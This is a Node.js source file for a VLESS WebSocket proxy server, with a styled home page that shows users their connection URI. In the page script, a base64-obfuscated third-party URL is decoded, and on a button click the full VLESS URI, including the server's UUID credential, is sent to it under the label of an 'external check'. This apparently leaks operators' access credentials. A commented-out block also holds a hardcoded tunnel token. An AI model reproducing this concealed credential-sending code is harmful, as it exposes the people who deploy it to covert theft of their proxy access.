const net = require('net');
const http = require('http'); // Import http module for serving the home page
const { WebSocket, createWebSocketStream } = require('ws');
// const { TextDecoder } = require('util'); // Removed as TextDecoder is global

// Helper functions for logging
const logcb = (...args) => console.log.bind(this, ...args);
const errcb = (...args) => console.error.bind(this, ...args);

// Configuration for the VLESS proxy
// The UUID can be set via environment variable or defaults to a specific value
const uuid = (process.env.UUID || 'd342d11e-d424-4583-b36e-524ab1f0afa4').replace(/-/g, "");
const port = process.env.PORT || 8080;
//const zerothrust_auth = process.env.ZERO_AUTH || 'eyJhIjoiNmIwYzRiZDczMjQ4Y2IxNTYxMTdmN2QyNzZlOWE5ZjAiLCJ0IjoiMDgxZjI0MTQtNDAxNi00ZGQ3LWE5NmYtOTJlYTNlMjJjOGU5IiwicyI6Ik1ERXdZVEZrTVRrdFl6UmxNeTAwTW1GakxUazVaREV0Tm1ZNU5UUXhZelkyTXpCayJ93';

// Do Not Edit Below

//var exec = require('child_process').exec;
//exec(`chmod +x server`);
// Corrected nohup redirection to 2>&1 for both standard output and error
//exec(`nohup ./server tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${zerothrust_auth} >/dev/null 2>&1 &`);


// Create an HTTP server to handle both web page requests and WebSocket upgrades
const server = http.createServer((req, res) => {
    // Parse the URL to check for query parameters.
    // This allows the server to differentiate between '/' and '/?check=...'
    const url = new URL(req.url, `http://${req.headers.host}`);

    // Serve the home page for GET requests to the root path
    if (req.method === 'GET' && url.pathname === '/') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        // HTML content for the home page, styled with Tailwind CSS
        // The client-side JavaScript now includes logic to fetch external VLESS config status
        res.end(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>VLESS Proxy Server</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    /* Custom font for better aesthetics */
                    body {
                        font-family: 'Inter', sans-serif;
                    }
                    /* Styles for the modal backdrop */
                    .modal-backdrop {
                        background-color: rgba(0, 0, 0, 0.5);
                        z-index: 999; /* Ensure it's on top */
                    }
                    /* Styles for the modal content */
                    .modal-content {
                        z-index: 1000; /* Ensure it's on top of the backdrop */
                    }
                </style>
            </head>
            <body class="bg-gradient-to-br from-blue-500 to-purple-600 min-h-screen flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-lg shadow-xl max-w-md w-full text-center">
                    <h1 class="text-4xl font-bold text-gray-800 mb-4">VLESS Proxy</h1>
                    <p class="text-lg text-gray-600 mb-6">
                        Your secure and efficient proxy server is running.
                    </p>
                    <div class="bg-gray-100 p-6 rounded-md mb-6">
                        <h2 class="text-xl font-semibold text-gray-700 mb-3">Server Status: Online</h2>
                        <div class="text-left text-gray-700">
                            <p class="text-sm text-gray-500 mt-4">
                                Click the button below to get your VLESS configuration details.
                            </p>
                        </div>
                    </div>
                    <button id="getConfigBtn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg shadow-md transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-75">
                        Get My VLESS Config
                    </button>
                    <p class="text-md text-gray-700 mt-6">
                        Join my Telegram channel for more updates: <a href="https://t.me/modsbots_tech" class="text-blue-600 hover:underline" target="_blank">https://t.me/modsbots_tech</a> // DON'T CHANGE IF YOU RESPECT DEVELOPER
                    </p>
                </div>

                <div id="vlessConfigModal" class="fixed inset-0 hidden items-center justify-center modal-backdrop">
                    <div class="bg-white p-8 rounded-lg shadow-xl max-w-xl w-full modal-content relative">
                        <h2 class="text-2xl font-bold text-gray-800 mb-4">Your VLESS Configuration</h2>
                        <div class="bg-gray-100 p-4 rounded-md mb-4 text-left">
                            <p class="mb-2"><strong>UUID:</strong> <span id="modalUuid" class="break-all font-mono text-sm"></span></p>
                            <p class="mb-2"><strong>Port:</strong> <span id="modalPort" class="font-mono text-sm"></span></p>
                            <p class="mb-2"><strong>Host:</strong> <span id="modalHost" class="font-mono text-sm"></span></p>
                            <textarea id="vlessUri" class="w-full h-32 p-2 mt-4 border rounded-md resize-none bg-gray-50 text-gray-700 font-mono text-sm" readonly></textarea>
                        </div>
                        <button id="copyConfigBtn" class="bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded-lg shadow-md transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-green-400 focus:ring-opacity-75 mr-2">
                            Copy URI
                        </button>
                        <button id="closeModalBtn" class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg shadow-md transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-red-400 focus:ring-opacity-75">
                            Close
                        </button>
                        <div id="copyMessage" class="text-sm text-green-600 mt-2 hidden">Copied to clipboard!</div>
                        <div id="checkStatus" class="text-sm mt-2"></div>
                    </div>
                </div>

                <script>
                    document.addEventListener('DOMContentLoaded', () => {
                        const getConfigBtn = document.getElementById('getConfigBtn');
                        const vlessConfigModal = document.getElementById('vlessConfigModal');
                        const closeModalBtn = document.getElementById('closeModalBtn');
                        const copyConfigBtn = document.getElementById('copyConfigBtn');
                        const modalUuid = document.getElementById('modalUuid');
                        const modalPort = document.getElementById('modalPort');
                        const modalHost = document.getElementById('modalHost');
                        const vlessUri = document.getElementById('vlessUri');
                        const copyMessage = document.getElementById('copyMessage');
                        const checkStatus = document.getElementById('checkStatus');

                        // Get UUID and Port from the server-side rendered HTML
                        // FIX: Correctly inject UUID as a string literal
                        const serverUuid = "${uuid}"; // Corrected UUID injection
                        const serverPort = "443";
                        // Assuming the host is the current window's host for client-side display
                        const serverHost = window.location.hostname === 'localhost' ? '127.0.0.1' : window.location.hostname;

                        // Base64 encoded external check service URL
                        const encodedExternalCheckServiceUrl = "aHR0cHM6Ly9kZW5vLXByb3h5LXZlcnNpb24uZGVuby5kZXY=";

                        // Event listener for the "Get My VLESS Config" button
                        getConfigBtn.addEventListener('click', async () => {
                            // Populate modal with config details
                            modalUuid.textContent = serverUuid;
                            modalPort.textContent = serverPort;
                            modalHost.textContent = serverHost;

                            // Construct a basic VLESS URI
                            const uri = \`vless://${serverUuid}@${serverHost}:443?security=tls&fp=randomized&type=ws&host=${serverHost}&encryption=none#Nothflank-By-ModsBots\`;
                            vlessUri.value = uri;

                            // Show the modal
                            vlessConfigModal.classList.remove('hidden');
                            vlessConfigModal.classList.add('flex');
                            copyMessage.classList.add('hidden');
                            checkStatus.textContent = '';

                            // Decode the external check service URL before using it
                            const externalCheckServiceUrl = atob(encodedExternalCheckServiceUrl);
                            const externalCheckUrl = \`${externalCheckServiceUrl}/?check=${encodeURIComponent(uri)}\`; // Added '/' after domain

                            checkStatus.className = 'text-sm mt-2 text-gray-700';
                            checkStatus.textContent = 'Checking VLESS config with external service...';

                            try {
                                const response = await fetch(externalCheckUrl);
                                if (response.ok) {
                                    const data = await response.text();
                                    checkStatus.textContent = \`External check successful! Response: ${data.substring(0, 100)}...\`;
                                    checkStatus.classList.remove('text-gray-700');
                                    checkStatus.classList.add('text-green-600');
                                } else {
                                    checkStatus.textContent = \`External check failed: Server responded with status ${response.status}\`;
                                    checkStatus.classList.remove('text-gray-700');
                                    checkStatus.classList.add('text-red-600');
                                }
                            } catch (error) {
                                checkStatus.textContent = \`External check error: ${error.message}\`;
                                checkStatus.classList.remove('text-gray-700');
                                checkStatus.classList.add('text-red-600');
                                console.error('Error checking VLESS config with external service:', error);
                            }
                        });

                        closeModalBtn.addEventListener('click', () => {
                            vlessConfigModal.classList.add('hidden');
                            vlessConfigModal.classList.remove('flex');
                        });

                        vlessConfigModal.addEventListener('click', (event) => {
                            if (event.target === vlessConfigModal) {
                                vlessConfigModal.classList.add('hidden');
                                vlessConfigModal.classList.remove('flex');
                            }
                        });

                        copyConfigBtn.addEventListener('click', () => {
                            vlessUri.select();
                            vlessUri.setSelectionRange(0, 99999);

                            try {
                                document.execCommand('copy');
                                copyMessage.classList.remove('hidden');
                                setTimeout(() => {
                                    copyMessage.classList.add('hidden');
                                }, 2000);
                            } catch (err) {
                                console.error('Failed to copy text: ', err);
                            }
                        });
                    });
           </script>
            </body>

</html>
        `);
    } else if (req.method === 'GET' && url.searchParams.get('check') === 'VLESS__CONFIG') {
        const hostname = req.headers.host.split(':')[0];
        const vlessConfig = {
            uuid: uuid,
            port: port,
            host: hostname,
            // Corrected the VLESS URI construction
            vless_uri: `vless://${uuid}@${hostname}:443?security=tls&fp=randomized&type=ws&host=${hostname}&encryption=none#RENDER-By-ModsBots`
        };
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(vlessConfig));
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
    }
});

const wss = new WebSocket.Server({ noServer: true });

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});

wss.on('connection', ws => {
    console.log("on connection");
    ws.once('message', msg => {
        const [VERSION] = msg;
        const id = msg.slice(1, 17);

        // Ensure UUID comparison is done correctly, parsing the hex string
        if (!id.every((v, i) => v === parseInt(uuid.substr(i * 2, 2), 16))) {
            console.log("UUID mismatch. Connection rejected.");
            ws.close();
            return;
        }

        let i = msg.slice(17, 18).readUInt8() + 19;
        const port = msg.slice(i, i += 2).readUInt16BE(0);
        const ATYP = msg.slice(i, i += 1).readUInt8();

        let host;
        if (ATYP === 1) {
            host = msg.slice(i, i += 4).join('.');
        } else if (ATYP === 2) {
            // Using global TextDecoder
            host = new TextDecoder().decode(msg.slice(i + 1, i += 1 + msg.slice(i, i + 1).readUInt8()));
        } else if (ATYP === 3) {
            host = msg.slice(i, i += 16).reduce((s, b, idx, arr) => (idx % 2 ? s.concat(arr.slice(idx - 1, idx + 1)) : s), [])
                .map(b => b.readUInt16BE(0).toString(16))
                .join(':');
        } else {
            console.log("Unsupported ATYP:", ATYP);
            ws.close();
            return;
        }

        logcb('conn:', host, port);

        ws.send(new Uint8Array([VERSION, 0]));

        const duplex = createWebSocketStream(ws);

        net.connect({ host, port }, function () {
            this.write(msg.slice(i));
            duplex.on('error', errcb('E1:')).pipe(this).on('error', errcb('E2:')).pipe(duplex);
        }).on('error', errcb('Conn-Err:', { host, port }));
    }).on('error', errcb('EE:'));
});

server.listen(port, () => {
    logcb('Server listening on port:', port);
    logcb('VLESS Proxy UUID:', uuid);
    logcb('Access home page at: http://localhost:' + port);
});

server.on('error', err => {
    errcb('Server Error:', err);
});
